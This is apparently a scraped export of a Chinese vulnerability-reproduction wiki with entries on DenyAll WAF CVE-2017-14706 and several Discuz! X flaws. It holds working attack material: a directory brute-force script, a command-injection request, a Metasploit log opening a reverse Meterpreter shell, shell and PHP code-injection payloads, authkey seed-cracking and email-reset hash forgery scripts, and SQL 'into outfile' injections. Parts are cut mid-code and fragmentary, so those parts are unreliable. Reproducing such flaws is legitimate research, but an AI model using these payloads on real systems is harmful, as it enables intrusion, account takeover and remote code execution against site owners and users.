dopost=save&_FILES[b4dboy][tmp_name]=./deCommon.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例 当目录存在点时候 当目录不存在点时候 python脚本 #!/usr/bin/env python #coding:utf-8 import requests import itertools from random import choice import sys characters = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!#@-\" back_dir = \"\" show_message = {} check_message = {} valid_file = [] data = { \"_FILES[tools][tmp_name]\" : \"./../{p}\"+res.text if \"Upload filetype not allow !\" in res.text and res.status_code == 200: valid_file.append(filename) except: pass #print valid_file #print valid_file if len(valid_file): if \"/tags.php\" in valid_file: for i in valid_file: if i == \"/tags.php\": return i else: file_name = choice(valid_file) return file_name else: return False def Bute(self): f_name = self.Check() #print f_name if f_name != False: if f_name == \"/tags.php\": prefix = \"./\" else: prefix = \"./../\" flag = 0 global characters,back_dir,data,check_message for num in range(1,7): if flag: break for pre in itertools.permutations(characters,num): pre = ''.join(list(pre)) data[\"_FILES[tools][tmp_name]\"] = data[\"_FILES[tools][tmp_name]\"].format(p=pre) print(\"testing\",pre) r = requests.post(self.target+f_name,data=data) if \"Upload filetype not allow !\" not in r.text and r.status_code == 200: flag = 1 back_dir = pre data[\"_FILES[tools][tmp_name]\"] = \"%s{p}Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:02 "},"Web安全/DenyAll WAF/（CVE-2017-14706）DenyAll WAF  6.3.0 远程命令执行漏洞/（CVE-2017-14706）DenyAll WAF  6.3.0 远程命令执行漏洞.html":{"url":"Web安全/DenyAll WAF/（CVE-2017-14706）DenyAll WAF  6.3.0 远程命令执行漏洞/（CVE-2017-14706）DenyAll WAF  6.3.0 远程命令执行漏洞.html","title":"（CVE-2017-14706）DenyAll WAF  6.3.0 远程命令执行漏洞","keywords":"","body":"（CVE-2017-14706）DenyAll WAF \\ 一、漏洞简介 二、漏洞影响 DenyAll WAF \\ 三、复现过程 漏洞分析 其实，DenyAll WAF中存在多处命令注入，其中一处为/webservices/stream/tail.php，以下是其中的一段代码： if(isset($_REQUEST['iToken'])){ if($local->getIToken()!=$_REQUEST['iToken']){ exitPrint(t_(\"Bad key, authentication on slave streaming server failed\")); } }else{ exitPrint(t_(\"Authentication on slave streaming server failed\")); } if(isset($_REQUEST['tag']) && $_REQUEST['tag']!=''){ // on doit chercher le bon fichier if(isset($_REQUEST['stime'])&&$_REQUEST['stime']!=''){ // Start time version tailDateFile(); }else{ // dernier fichier ouvert if($_REQUEST['tag']=='tunnel') $_REQUEST['file']=basename(shell_run(\"ls -1t \".__RP_LOG__.\"*/\".$_REQUEST['uid'].\"/*-\".$_REQUEST['type'].\".log| head -n1 2>/dev/null\")); else $_REQUEST['file']=$_REQUEST['uid'].'-'.$_REQUEST['type'].'.log'; } } 在iToken可被泄露的情况下，这里又出现了另一个函数tailDateFile()，以下是其具体代码： function tailDateFile(){ global $_REQUEST; $stime=(int)($_REQUEST['stime']/1000); $tag=$_REQUEST['tag']; $uid=$_REQUEST['uid']; $type=$_REQUEST['type']; // access or error chdir(__RP_LOG__); if($tag=='tunnel'){ // reverse proxy $files=shell_run(\"ls -1 */$uid/*-$type-*.log 2>/dev/null|sort\").\"\\n\"; // avec date trié au début $files.=shell_run(\"ls -1t */$uid/*-$type.log 2>/dev/null\"); // courant trié par utilisation }else{ $files=shell_run(\"ls -1 $uid-$type*-log 2>/dev/null|sort\").\"\\n\"; $files.=shell_run(\"ls -1t $uid-$type.log 2>/dev/null\"); } // .. CODE OMITTED .. } 从以上代码可以看到，$uid参数可被控制，而且它还是shell_run()函数变量的一部分。结合上述提及的这两方面问题，我们就能实现未授权命令注入漏洞。 PoC 通过HTTP请求触发远程RCE实现： GET /webservices/stream/tail.php?iToken=y760e0299ba6fc1a2739df5a8f64fc5a&tag=tunnel&stime=aaa&type=aaa$(sleep%2030\") HTTP/1.1 Host: www.0-sec.org:3001 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: connect.sid=s%3AWGBO5SaeECriIG8z4SMjwilZgl7SM0ej.0hGC0CcXrwnoJLb4YucLi8lbr%2FC8f2TNIicG4EmFLFU Connection: close Upgrade-Insecure-Requests: 1 Metasploit反弹控制模块 https://github.com/rapid7/metasploit-framework/pull/8980 msf exploit(denyall_exec) > set RHOST 35.176.123.128 RHOST => 35.176.123.128 msf exploit(denyall_exec) > set LHOST 35.12.3.3 LHOST => 35.12.3.3 msf exploit(denyall_exec) > check [*] 35.176.123.128:3001 The target appears to be vulnerable. msf exploit(denyall_exec) > exploit [-] Handler failed to bind to 35.12.3.3:4444:- - [*] Started reverse TCP handler on 0.0.0.0:4444 [*] Extracting iToken value from unauthenticated accessible endpoint. [+] Awesome. iToken value = n84b214ad1f53df0bd6ffa3dcfe8059a [*] Trigerring command injection vulnerability with iToken value. [*] Sending stage (40411 bytes) to 127.0.0.1 [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:60556) at 2017-09-19 14:31:52 +0300 meterpreter > pwd /var/log/denyall/reverseproxy meterpreter > exit [*] Shutting down Meterpreter... [*] 172.31.11.218 - Meterpreter session 1 closed. Reason: User exit msf exploit(denyall_exec) > exit Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:12 "},"Web安全/Discuz/（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell/（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell.html":{"url":"Web安全/Discuz/（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell/（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell.html","title":"（CVE-2018-14729）Discuz! X1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell","keywords":"","body":"（CVE-2018-14729）Discuz!X 1.5 ~ X2.5 后台数据库备份功能远程命令执行 Getshell 一、漏洞简介 二、漏洞影响 Discuz! X1.5-2.5 三、复现过程 漏洞分析 需要注意的是这个漏洞其实是需要登录后台的，并且能有数据库备份权限，所以比较鸡肋。 我这边是用Discuz! 2.5完成漏洞复现的，并用此进行漏洞分析的。 漏洞点在： source/admincp/admincp_db.php 第296行： @shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($_GET['extendins'] == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $_GET['sqlcompat'] == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host=\"'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket=\"'.$dbport.'\"') : '').'\" --user=\"'.$dbuser.'\" --password=\"'.$dbpw.'\" \"'.$dbname.'\" '.$tablesstr.' > '.$dumpfile); 在shell_exec()函数中可控点在$tablesstr，向上看到第281行： $tablesstr = ''; foreach($tables as $table) { $tablesstr .= '\"'.$table.'\" '; } 跟一下$table的获取流程，在上面的第143行： if($_GET['type'] == 'discuz' || $_GET['type'] == 'discuz_uc') { $tables = arraykeys2(fetchtablelist($tablepre), 'Name'); } elseif($_GET['type'] == 'custom') { $tables = array(); if(empty($_GET['setup'])) { $tables = C::t('common_setting')->fetch('custombackup', true); } else { C::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']); $tables = & $_GET['customtables']; } if( !is_array($tables) || empty($tables)) { cpmsg('database_export_custom_invalid', '', 'error'); } } 可以看到： C::t('common_setting')->update('custombackup', empty($_GET['customtables'])? '' : $_GET['customtables']); $tables = & $_GET['customtables']; 首先会从$_GET的数组中获取customtables字段的内容，判断内容是否为空，不为空则将从外部获取到的customtables字段内容写入common_setting表的skey=custombackup的svalue字段，写入过程中会将这个字段做序列化存储： Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId25.jpg) 之后再将该值赋给$tables。 至此可以看到漏洞产生的原因是由于shell_exec()中的$tablesstr可控，导致代码注入。 漏洞复现 首先抓个包 Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId27.jpg) 这样可以抓到符合我们条件的请求包。 Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId28.jpg) 接下来只需要将customtables的内容更改一下就可以造成命令执行了： customtables[] = pre_common_admincp_cmenu\">aaa; echo '' > phpinfo.php # Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId29.jpg) Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId30.jpg) 效果为： Discuz!X1.5~X2.5后台数据库备份功能远程命令执行Getshell/media/rId31.jpg) 参考链接 https://github.com/FoolMitAh/CVE-2018-14729/blob/master/Discuz\\_backend\\_getshell.md https://www.anquanke.com/post/id/158270 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:40 "},"Web安全/Discuz/Discuz! X  3.4 authkey 算法的安全性漏洞/Discuz! X  3.4 authkey 算法的安全性漏洞.html":{"url":"Web安全/Discuz/Discuz! X  3.4 authkey 算法的安全性漏洞/Discuz! X  3.4 authkey 算法的安全性漏洞.html","title":"Discuz! X  3.4 authkey 算法的安全性漏洞","keywords":"","body":"Discuz! X \\ 一、漏洞简介 2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等... 二、漏洞影响 php>5.3+php-curl\\ Discuz_X3.3_SC_GBK Discuz_X3.3_SC_UTF8 Discuz_X3.3_TC_BIG5 Discuz_X3.3_TC_UTF8 Discuz_X3.2_SC_GBK Discuz_X3.2_SC_UTF8 Discuz_X3.2_TC_BIG5 Discuz_X3.2_TC_UTF8 Discuz_X2.5_SC_GBK Discuz_X2.5_SC_UTF8 Discuz_X2.5_TC_BIG5 Discuz_X2.5_TC_UTF8 三、复现过程 漏洞分析 在dz3.3/upload/install/index.php 346行 我们看到authkey是由多个参数的md5前6位加上random生成的10位产生的。 跟入random函数 当php版本大于4.2.0时，随机数种子不会改变 我们可以看到在生成authkey之后，使用random函数生成了4位cookie前缀 $_config['cookie']['cookiepre'] = random(4).'_'; 那么这4位cookie前缀就是我们可以得到的，那我们就可以使用字符集加上4位已知字符，爆破随机数种子。 首先我们需要先获得4位字符 如上图所示，前四位是sW7c 然后通过脚本生成用于php_mt_seed的参数 这里需要修改第13行代码，替换你自己的cookie前四位 # coding=utf-8 w_len = 10 result = \"\" str_list = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\" length = len(str_list) for i in xrange(w_len): result+=\"0 \" result+=str(length-1) result+=\" \" result+=\"0 \" result+=str(length-1) result+=\" \" sstr = \"sW7c\" for i in sstr: result+=str(str_list.index(i)) result+=\" \" result+=str(str_list.index(i)) result+=\" \" result+=\"0 \" result+=str(length-1) result+=\" \" print result 得到参数,使用php_mt_seed脚本 https://github.com/ianxtianxt/php-mt\\_rand ./php_mt_seed 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61 > result.txt 这里我获得了245组种子 接下来我们需要使用这245组随机数种子生成随机字符串 当我们获得了所有的后缀时，我们需要配合爆破6位字符（0-9a-f）来验证authkey的正确性,由于的数量差不多16**6*200+,为了在有限的时间内爆破出来，我们需要使用一个本地爆破的方式。 这里使用了找回密码中的id和sign参数，让我们一起来看看逻辑。 当我们点击忘记密码的时候。 会进入/source/module/member/member_lostpasswd.php 65行生成用于验证的sign值。 跟随make_getpws_sign函数进入/source/function/function_member.php 然后进入dsign函数，配合authkey生成结果 这里我们可以用python模拟这个过程，然后通过找回密码获得uid、id、sign，爆破判断结果。 poc http://www.0-sec.org/dz3.3/member?mod=getpasswd&uid=2&id=vnY6nW&sign=af3b937d0132a06b 自行修改第7,8,13行代码 # coding=utf-8 import itertools import hashlib import time def dsign(authkey): url = \"http://127.0.0.1/dz3.3/\" idstring = \"vnY6nW\" uid = 2 uurl = \"{}member.php?mod=getpasswd&uid={}&id={}\".format(url, uid, idstring) url_md5 = hashlib.md5(uurl+authkey) return url_md5.hexdigest()[:16] def main(): sign = \"af3b937d0132a06b\" str_list = \"0123456789abcdef\" with open('result2.txt') as f: ranlist = [s[:-1] for s in f] s_list = sorted(set(ranlist), key=ranlist.index) r_list = itertools.product(str_list, repeat=6) print \"[!] start running....\" s_time = time.time() for j in r_list: for s in s_list: prefix = \"\".join(j) authkey = prefix + s # print dsign(authkey) if dsign(authkey) == sign: print \"[*] found used time: \" + str(time.time() - s_time) return \"[*] authkey found: \" + authkey print main() 参考链接 https://lorexxar.cn/2017/08/31/dz-authkey/\\#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:30 "},"Web安全/Discuz/Discuz! X  3.4 uc_center 后台代码执行漏洞/Discuz! X  3.4 uc_center 后台代码执行漏洞.html":{"url":"Web安全/Discuz/Discuz! X  3.4 uc_center 后台代码执行漏洞/Discuz! X  3.4 uc_center 后台代码执行漏洞.html","title":"Discuz! X  3.4 uc_center 后台代码执行漏洞","keywords":"","body":"Discuz! X \\ 一、漏洞简介 二、漏洞影响 Discuz! X \\ 三、复现过程 进入后台站长-Ucenter设置，设置UC_KEY=随意(一定要记住，后面要用), UC_API= http://www.0-sec.org/discuz34/uc_server');phpinfo();// 1.png 2.png 成功写进配置文件，这里单引号被转移了，我们接下来使用UC_KEY(dz)去调用api/uc.php中的updateapps函数更新UC_API。 利用UC_KEY(dz) 生成code参数，使用过UC_KEY(dz) GetWebShell的同学肯定不陌生，这里使用的UC_KEY(dz)就是上面我们设置的。 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?> 将生成的数据带入GET请求中的code 参数，发送数据包 3.png 访问 http://www.0-sec.org/discuz34/config/config\\_ucenter.php 代码执行成功4.png 5.png 到此成功GetWebShell，在这个过程中，有一点需要注意的是，我们修改了程序原有的UC_KEY(dz)，成功GetWebShell以后一定要修复，有2中方法： 从数据库中读取authkey(uc_server)，通过UC_MYKEY解密获得UC_KEY(dz)，当然有可能authkey(uc_server)就是UC_KEY(dz)。 直接进入Ucenter后台修改UC_KEY，修改成我们GetWebShell过程中所设置的值。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:32 "},"Web安全/Discuz/Discuz! X 3.4 admincp_misc.php SQL注入漏洞/Discuz! X 3.4 admincp_misc.php SQL注入漏洞.html":{"url":"Web安全/Discuz/Discuz! X 3.4 admincp_misc.php SQL注入漏洞/Discuz! X 3.4 admincp_misc.php SQL注入漏洞.html","title":"Discuz! X 3.4 admincp_misc.php SQL注入漏洞","keywords":"","body":"Discuz! X 3.4 admincp_misc.php SQL注入漏洞 一、漏洞简介 由于是update型注入，我们在后台已经可以利用数据库备份获得数据，对本网站意义不大，但是有同mysql的其他网站，如果权限不严，跨库查询，搞定同mysql的其他网站。 二、漏洞影响 Discuz! X 3.4 三、复现过程 https://www.0-sec.org/admin.php?action=misc&operation=censor 192540_0de6824f_5044043.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:14 "},"Web安全/Discuz/Discuz! X authkey 重置任意账户邮箱/Discuz! X authkey 重置任意账户邮箱.html":{"url":"Web安全/Discuz/Discuz! X authkey 重置任意账户邮箱/Discuz! X authkey 重置任意账户邮箱.html","title":"Discuz! X authkey 重置任意账户邮箱","keywords":"","body":"Discuz! X authkey 重置任意账户邮箱 一、漏洞简介 需要得到authkey 二、漏洞影响 三、复现过程 当我们申请修改邮箱的时候，我们会受到一封类似于下面这样的邮件。 验证链接类似于 http://www.0-sec.org/dz3.3/home.php?mod=misc&ac=emailcheck&hash=0eb7yY2wtS1q16Zs2%2BtSkR6w5O%2Fx6jdLbu0FnWbegB8ixs2Y6tfcyAnrvz4yPIE7pKzoqawU0ku47y4F 跟入/source/include/misc/misc_emailcheck.php 代码如下： TIMESTAMP - 86400) { $member = getuserbyuid($uid); $setarr = array('email'=>$email, 'emailstatus'=>'1'); if($_G['member']['freeze'] == 2) { $setarr['freeze'] = 0; } loaducenter(); $ucresult = uc_user_edit(addslashes($member['username']), '', '', $email, 1); if($ucresult == -8) { showmessage('email_check_account_invalid', '', array(), array('return' => true)); } elseif($ucresult == -4) { showmessage('profile_email_illegal', '', array(), array('return' => true)); } elseif($ucresult == -5) { showmessage('profile_email_domain_illegal', '', array(), array('return' => true)); } elseif($ucresult == -6) { showmessage('profile_email_duplicate', '', array(), array('return' => true)); } if($_G['setting']['regverify'] == 1 && $member['groupid'] == 8) { $membergroup = C::t('common_usergroup')->fetch_by_credits($member['credits']); $setarr['groupid'] = $membergroup['groupid']; } updatecreditbyaction('realemail', $uid); C::t('common_member')->update($uid, $setarr); C::t('common_member_validate')->delete($uid); dsetcookie('newemail', \"\", -1); showmessage('email_check_sucess', 'home.php?mod=spacecp&ac=profile&op=password', array('email' => $email)); } else { showmessage('email_check_error', 'index.php'); } ?> 当hash传入的时候，服务端会调用authcode函数解码获得用户的uid，要修改成的email，时间戳。 list($uid, $email, $time) = explode(\"\\t\", authcode($_GET['hash'], 'DECODE', md5(substr(md5($_G['config']['security']['authkey']), 0, 16)))); 然后经过一次判断 if($uid && isemail($email) && $time > TIMESTAMP - 86400) { 这里没有任何额外的判断，在接下来的部分，也仅仅对uid的有效性做了判断，而uid代表这用户的id值，是从1开始自增的。 也就是说，只要authcode函数解开hash值，就能成功的验证并修改邮箱。 这里我们可以直接使用authcode函数来获得hash值 poc 这里需要修改md5(\\\"authkey\\\") 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } echo authcode(\"3\\ttest@success.com\\t1503556905\", 'ENCODE', md5(substr(md5(\"5e684ceqNxuCvmoK\"), 0, 16))); 访问hash页面，我们可以看到验证邮箱已经被修改了，接下来我们可以直接通过忘记密码来修改当前用户的密码。 参考链接 https://lorexxar.cn/2017/08/31/dz-authkey/\\#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:33 "},"Web安全/Discuz/Discuz! X Windows短文件名安全问题导致的数据库备份爆破/Discuz! X Windows短文件名安全问题导致的数据库备份爆破.html":{"url":"Web安全/Discuz/Discuz! X Windows短文件名安全问题导致的数据库备份爆破/Discuz! X Windows短文件名安全问题导致的数据库备份爆破.html","title":"Discuz! X Windows短文件名安全问题导致的数据库备份爆破","keywords":"","body":"Discuz! X Windows短文件名安全问题导致的数据库备份爆破 一、漏洞简介 看似是比较鸡肋的小技巧，但在猜一些随机命令的文件名时非常有用，比如：利用短文件名我们可以下载数据库备份文件（文件名中含有随机字符），利用备份文件我们可以尝试解密用户密码。 二、漏洞影响 存在Windows短文件名爆破的系统中 三、复现过程 1.png 数据库备份功能默认备份在目录\\\"backup_随机字符串\\\" 文件名为年月日_随机字符串 windows下短文件名访问文件或目录只需要知道前6个字符 backup正好6个 就可以判断备份目录是否存在 https://www.0-sec.org/data/backup~1/ 进而通过爆破年月日来寻找数据库备份文件 https://www.0-sec.org/data/backup~1/190814~1.sql 2.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:33 "},"Web安全/Discuz/Discuz! X 系列全版本 后台Sql注入漏洞/Discuz! X 系列全版本 后台Sql注入漏洞.html":{"url":"Web安全/Discuz/Discuz! X 系列全版本 后台Sql注入漏洞/Discuz! X 系列全版本 后台Sql注入漏洞.html","title":"Discuz! X 系列全版本 后台Sql注入漏洞","keywords":"","body":"Discuz! X 系列全版本 后台Sql注入漏洞 一、漏洞简介 利用条件： 1.知道网站的绝对路径 2.secure_file_priv的值为空 二、漏洞影响 Discuz!X 系列全版本 截止到 Discuz!X 3.4 R20191201 UTF-8 三、复现过程 挖过discuz 漏洞的都知道 它会对大部分传参进来的值进行过滤和校验 ，所以当时找了一个二次注入的点 uc_server\\model\\base.php 37行 base(); } function base() { $this->init_var(); $this->init_db(); $this->init_cache(); $this->init_app(); $this->init_user(); $this->init_template(); $this->init_note(); //跟进 $this->init_mail(); } uc_server\\model\\base.php 198行 开始 function init_note() { if($this->note_exists()) { //跟进 $this->load('note'); $_ENV['note']->send(); } } function note_exists() { $noteexists = $this->db->result_first(\"SELECT value FROM \".UC_DBTABLEPRE.\"vars WHERE name='noteexists\".UC_APPID.\"'\"); //从配置文件取值UC_APPID return FALSE; } else { return TRUE; } } 查找UC_APPID source\\admincp\\admincp_setting.php 2523行 $settingnew = $_GET['settingnew']; //传入 if($operation == 'credits') { $extcredits_exists = 0; foreach($settingnew['extcredits'] as $val) { if(isset($val['available']) && $val['available'] == 1) { $extcredits_exists = 1; break; } } if(!$extcredits_exists) { cpmsg('setting_extcredits_must_available'); } if($settingnew['report_reward']) { $settingnew['report_reward']['min'] = intval($settingnew['report_reward']['min']); $settingnew['report_reward']['max'] = intval($settingnew['report_reward']['max']); if($settingnew['report_reward']['min'] > $settingnew['report_reward']['max']) { unset($settingnew['report_reward']); } if($settingnew['report_reward']['min'] == $settingnew['report_reward']['max']) { $settingnew['report_reward'] = array('min' => '', 'max' => ''); } $settingnew['report_reward'] = serialize($settingnew['report_reward']); } $settingnew['creditspolicy'] = @dunserialize($setting['creditspolicy']); $settingnew['creditspolicy']['lowerlimit'] = array(); foreach($settingnew['lowerlimit'] as $key => $value) { if($settingnew['extcredits'][$key]['available']) { $settingnew['creditspolicy']['lowerlimit'][$key] = (float)$value; } } unset($settingnew['lowerlimit']); } if($operation == 'uc' && is_writeable('./config/config_ucenter.php') && $isfounder) { require_once './config/config_ucenter.php'; $ucdbpassnew = $settingnew['uc']['dbpass'] == '********' ? addslashes(UC_DBPW) : addslashes($settingnew['uc']['dbpass']); $settingnew['uc']['key'] = addslashes($settingnew['uc']['key'] == '********' ? addslashes(UC_KEY) : $settingnew['uc']['key']); if(function_exists(\"mysql_connect\") && ini_get(\"mysql.allow_local_infile\")==\"1\" && constant(\"UC_DBHOST\") != $settingnew['uc']['dbhost']){ cpmsg('uc_config_load_data_local_infile_error', '', 'error'); } if($settingnew['uc']['connect']) { $uc_dblink = function_exists(\"mysql_connect\") ? @mysql_connect($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew, 1) : new mysqli($settingnew['uc']['dbhost'], $settingnew['uc']['dbuser'], $ucdbpassnew); if(!$uc_dblink) { cpmsg('uc_database_connect_error', '', 'error'); } else { if(function_exists(\"mysql_connect\")) { mysql_close($uc_dblink); } else { $uc_dblink->close(); } } } $fp = fopen('./config/config_ucenter.php', 'r'); $configfile = fread($fp, filesize('./config/config_ucenter.php')); $configfile = trim($configfile); $configfile = substr($configfile, -2) == '?>' ? substr($configfile, 0, -2) : $configfile; fclose($fp); $connect = ''; $settingnew['uc'] = daddslashes($settingnew['uc']); if($settingnew['uc']['connect']) { $connect = 'mysql'; $samelink = ($dbhost == $settingnew['uc']['dbhost'] && $dbuser == $settingnew['uc']['dbuser'] && $dbpw == $ucdbpassnew); $samecharset = !($dbcharset == 'gbk' && UC_DBCHARSET == 'latin1' || $dbcharset == 'latin1' && UC_DBCHARSET == 'gbk'); $configfile = str_replace(\"define('UC_DBHOST', '\".addslashes(UC_DBHOST).\"')\", \"define('UC_DBHOST', '\".$settingnew['uc']['dbhost'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBUSER', '\".addslashes(UC_DBUSER).\"')\", \"define('UC_DBUSER', '\".$settingnew['uc']['dbuser'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBPW', '\".addslashes(UC_DBPW).\"')\", \"define('UC_DBPW', '\".$ucdbpassnew.\"')\", $configfile); if(!preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbtablepre']) || !preg_match('/^[\\w\\d\\_]+$/', $settingnew['uc']['dbname'])) { cpmsg('uc_config_write_error', '', 'error'); } $configfile = str_replace(\"define('UC_DBNAME', '\".addslashes(UC_DBNAME).\"')\", \"define('UC_DBNAME', '\".$settingnew['uc']['dbname'].\"')\", $configfile); $configfile = str_replace(\"define('UC_DBTABLEPRE', '\".addslashes(UC_DBTABLEPRE).\"')\", \"define('UC_DBTABLEPRE', '`\".$settingnew['uc']['dbname'].'`.'.$settingnew['uc']['dbtablepre'].\"')\", $configfile); } $configfile = str_replace(\"define('UC_CONNECT', '\".addslashes(UC_CONNECT).\"')\", \"define('UC_CONNECT', '\".$connect.\"')\", $configfile); $configfile = str_replace(\"define('UC_KEY', '\".addslashes(UC_KEY).\"')\", \"define('UC_KEY', '\".$settingnew['uc']['key'].\"')\", $configfile); $configfile = str_replace(\"define('UC_API', '\".addslashes(UC_API).\"')\", \"define('UC_API', '\".$settingnew['uc']['api'].\"')\", $configfile); $configfile = str_replace(\"define('UC_IP', '\".addslashes(UC_IP).\"')\", \"define('UC_IP', '\".$settingnew['uc']['ip'].\"')\", $configfile); $configfile = str_replace(\"define('UC_APPID', '\".addslashes(UC_APPID).\"')\", \"define('UC_APPID', '\".$settingnew['uc']['appid'].\"')\", $configfile); $fp = fopen('./config/config_ucenter.php', 'w'); if(!($fp = @fopen('./config/config_ucenter.php', 'w'))) { cpmsg('uc_config_write_error', '', 'error'); } @fwrite($fp, trim($configfile)); // 写入到config_ucenter.php 可控UC_APPID 的值 通过上面代码可以看出来只简单的addslashes了一下 @fclose($fp); } isset($settingnew['regname']) && empty($settingnew['regname']) && $settingnew['regname'] = 'register'; isset($settingnew['reglinkname']) && empty($settingnew['reglinkname']) && $settingnew['reglinkname'] = cplang('reglinkname_default'); $nohtmlarray = array('bbname', 'regname', 'reglinkname', 'icp', 'sitemessage', 'site_qq'); foreach($nohtmlarray as $k) { if(isset($settingnew[$k])) { $settingnew[$k] = dhtmlspecialchars($settingnew[$k]); } } if(isset($settingnew['statcode'])) { $settingnew['statcode'] = preg_replace('/language\\s*=[\\s|\\'|\\\"]*php/is', '_', $settingnew['statcode']); $settingnew['statcode'] = str_replace(array(''), array(''), $settingnew['statcode']); } 转义一次的字符串被写人文件中，在PHP解析时就是没有转义过的原始内容 造成了二次注入的产生 漏洞验证 直接构造语句 1' into outfile 'c:\\\\wamp64\\\\tmp\\\\1.txt' -- a 构造报错注入 补充： UCenter 应用 ID填入exp，然后提交 1' union select 'abc' into outfile 'c:\\6.txt' -- a Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:34 "},"Web安全/Discuz/Discuz! X 系列全版本 版本转换功能导致Getshell/Discuz! X 系列全版本 版本转换功能导致Getshell.html":{"url":"Web安全/Discuz/Discuz! X 系列全版本 版本转换功能导致Getshell/Discuz! X 系列全版本 版本转换功能导致Getshell.html","title":"Discuz! X 系列全版本 版本转换功能导致Getshell","keywords":"","body":"Discuz! X 系列全版本，版本转换功能导致Getshell 一、漏洞简介 存在问题的代码在/utility/convert/目录下，这部分的功能主要是用于Dz系列产品升级/转换。 二、漏洞影响 Discuz! X 全版本 三、复现过程 漏洞分析 入口utility/convert/index.php require './include/common.inc.php'; $action = getgpc('a'); $action = empty($action) ? getgpc('action') : $action; $source = getgpc('source') ? getgpc('source') : getgpc('s'); 取$_POST['a'],直接赋值给$action，此时$action = config; } elseif($action == 'config' || CONFIG_EMPTY) { require DISCUZ_ROOT.'./include/do_config.inc.php'; } elseif($action == 'setting') { 满足条件，引入./include/do_config.inc.php @touch($configfile); ...... if(submitcheck()) { $newconfig = getgpc('newconfig'); if(is_array($newconfig)) { $checkarray = $setting['config']['ucenter'] ? array('source', 'target', 'ucenter') : array('source', 'target'); foreach ($checkarray as $key) { ...... } save_config_file($configfile, $newconfig, $config_default); $newconfig从$_POST[newconfig]获取数据，save_config_file函数保将$newconfig保存到$configfile文件中，即config.inc.php文件。跟进该函数。 function save_config_file($filename, $config, $default) { $config = setdefault($config, $default);// 将$config中的空白项用 $default 中对应项的值填充 $date = gmdate(\"Y-m-d H:i:s\", time() + 3600 * 8); $year = date('Y'); $content = $config)); $content .= \"\\r\\n// \".str_pad(' THE END ', 50, '-', STR_PAD_BOTH).\" //\\r\\n\\r\\n?>\"; file_put_contents($filename, $content); } getvars函数处理，此时的$config = $newconfig+config.default.php对应项的补充。看一下getvars函数： function getvars($data, $type = 'VAR') { $evaluate = ''; foreach($data as $key => $val) { if(!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $key)) { continue; } if(is_array($val)) { $evaluate .= buildarray($val, 0, \"\\${$key}\").\"\\r\\n\"; } else { $val = addcslashes($val, '\\'\\\\'); $evaluate .= $type == 'VAR' ? \"\\$$key = '$val';\\n\" : \"define('\".strtoupper($key).\"', '$val');\\n\"; } } return $evaluate; } 满足if条件会执行buildarray函数，此时$key=_config，$val=上面的$config。最终造成写入的在该函数中（update.php 2206行）： foreach ($array as $key => $val) { if($level == 0) { //str_pad — 使用另一个字符串填充字符串为指定长度 // 第一个参数是要输出的字符串，指定长度为50，用'-'填充，居中 $newline = str_pad(' CONFIG '.strtoupper($key).' ', 50, '-', STR_PAD_BOTH); 